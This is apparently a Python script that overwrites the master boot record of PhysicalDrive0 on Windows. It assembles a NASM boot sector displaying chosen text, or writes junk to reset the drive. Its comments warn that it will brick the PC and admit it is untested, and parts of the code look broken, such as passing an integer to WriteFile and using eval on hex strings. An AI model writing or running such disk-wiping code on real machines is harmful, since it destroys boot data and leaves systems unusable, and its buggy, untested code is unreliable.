#credits to https://github.com/Itzsten/Python-MBR-Overwriting/
#WARNING: this code will brick your PC!
#this code don`t, so it can contain bugs or not work
#HELP US: test this software on virtual machine to we can know is this works! (p.s. i can`t run virtual machine because i haven`t space on my disk)
from win32file import *
import win32con
from message_box import MessageBox, MessageBoxButton
from os import system, getcwd
from enum import Enum

class BIOScolor(Enum):
    #source: https://en.wikipedia.org/wiki/BIOS_color_attributes
    BLACK = 'Black'
    BLUE = 'Blue'
    GREEN = 'Green'
    CYAN = 'Cyan'
    RED = 'Red'
    MAGENTA = 'Magenta'
    BROWN = 'Brown'
    LGRAY = 'Light Gray'
    DGRAY = 'Dark Gray'
    LBLUE = 'Light Blue'
    LGREEN = 'Light Green'
    LCYAN = 'Light Cyan'
    LRED = 'Light Red'
    LMAGENTA = 'Light Magenta'
    YELLOW = 'Yellow'
    WHITE = 'White'

def _text_to_hex(text: str, color: BIOScolor = BIOScolor.WHITE):
    #tutorial: https://youtu.be/qrRGprIIOgo?si=fXI4gwxHFuDI1uBF&t=223
    with open(fr'{getcwd()}\NASM\clutter.asm', 'w') as fl:
        fl.write(f"""[BITS 16]
[ORG 7C00h]
    jmp     main
main:
    xor     ax, ax     ; DS=0
    mov     ds, ax
    cld                ; DF=0 because our LODSB requires it
    mov     ax, 0012h  ; Select 640x480 16-color graphics video mode
    int     10h
    mov     si, string
    mov     bl, 9      ; {color.value}
    call    printstr
    jmp     $

printstr:
    mov     bh, 0     ; DisplayPage
print:
    lodsb
    cmp     al, 0
    je      done
    mov     ah, 0Eh   ; BIOS.Teletype
    int     10h
    jmp     print
done:
    ret

string db "{text.replace('\n', '", 13, 10, "')}"

times 510 - ($-$$) db 0
dw      0AA55h""")
    system(r'.\NASM\nasm -f bin NASM\clutter.asm -o NASM\clutter.bin')
    system(r'.\NASM\HexFileConverter.exe NASM\clutter.bin')
    with open(fr'{getcwd()}\NASM\clutter.bin.hex') as fl:
        hex_data = fl.read()
    return [eval('0x' + data.rstrip('\n')) for data in hex_data.split()]

def reset():
    box = MessageBox('Warning', 'Do you really want ot reset your MBR?', button=MessageBoxButton.YN)
    box.show()
    if box.result_bool:
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0", win32con.GENERIC_WRITE, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None, win32con.OPEN_EXISTING, 0,0)
        WriteFile(hDevice, 0, None)
        CloseHandle(hDevice)

def overwrite_text(text: str, color: BIOScolor):
    box = MessageBox('Warning', 'Do you really want ot reset your MBR?', button=MessageBoxButton.YN)
    box.show()
    if box.result_bool:
        hex_data = _text_to_hex(text, color)
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0", win32con.GENERIC_WRITE, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None, win32con.OPEN_EXISTING, 0,0)
        WriteFile(hDevice, hex_data, None)
        CloseHandle(hDevice)